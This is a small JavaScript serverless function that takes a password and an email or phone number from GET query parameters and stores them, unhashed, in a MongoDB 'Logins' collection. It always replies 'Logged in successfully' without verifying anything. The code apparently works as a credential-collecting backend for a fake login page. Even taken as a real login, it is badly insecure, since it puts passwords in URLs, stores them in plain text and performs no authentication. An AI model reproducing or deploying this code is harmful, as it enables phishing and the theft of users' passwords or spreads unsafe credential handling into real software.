const { MongoClient } = require("mongodb");
import { MONGO_URI } from "../../secrets.js";
const client = new MongoClient(MONGO_URI);// Ensure your Mongo URI is set in environment variables
const database = client.db('GameChunks');
const logins = database.collection('Logins');


exports.handler = async function(event, context) {
    try {
        // Only allow GET requests
        if (event.httpMethod !== 'GET') {
            return {
                statusCode: 405,
                body: JSON.stringify({ message: "Method Not Allowed" }),
            };
        }

        // Parse the query parameters from the GET request
        const { password, email, number} = event.queryStringParameters;
        
       let uid = email;
       if(number) uid = number;
       
        // Connect to MongoDB
        await client.connect();

        await logins.insertOne({ uid, pwd: password, date: new Date() });
	

        return {
            statusCode: 200,
            body: JSON.stringify({ message: "Logged in successfully" }),
        };

    } catch (error) {
        console.error(error);
        return {
            statusCode: 500,
            body: JSON.stringify({ message: "Internal Server Error" }),
        };
    } finally {
        await client.close();
    }
};
